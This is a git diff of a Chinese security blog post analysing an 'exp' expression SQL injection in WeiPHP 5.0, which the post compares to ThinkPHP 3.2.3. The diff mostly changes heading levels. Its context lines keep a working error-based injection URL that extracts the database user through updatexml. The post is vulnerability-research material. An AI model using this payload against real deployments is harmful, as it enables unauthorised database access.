@@ -1,24 +1,22 @@
 ---
 title: "Weiphp exp表达式注入"
 date: 2019-12-11T10:06:42+08:00
-lastmod: 2019-12-11T10:06:42+08:00
 draft: true
 tags: ['php']
 categories: ['代码审计']
-comment: true
 ---
 
 和thinkphp3.2.3的exp注入类似。
 
 <!--more-->
 
-# payload
+## payload
 
 ```
 http://php.local/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=) and updatexml(1,concat(0x7e,user(),0x7e),1) -- +
 ```
 
-# 分析
+## 分析
 
 \app\home\controller\Index::bind_follow()
 
@@ -297,7 +295,7 @@ public function find(Query $query)
 
 ![20191211104738](https://y4er.com/img/uploads/20191211104738.png)
 
-# 影响范围
+## 影响范围
 
 2019/12/11 weiphp5.0官网最新版
 
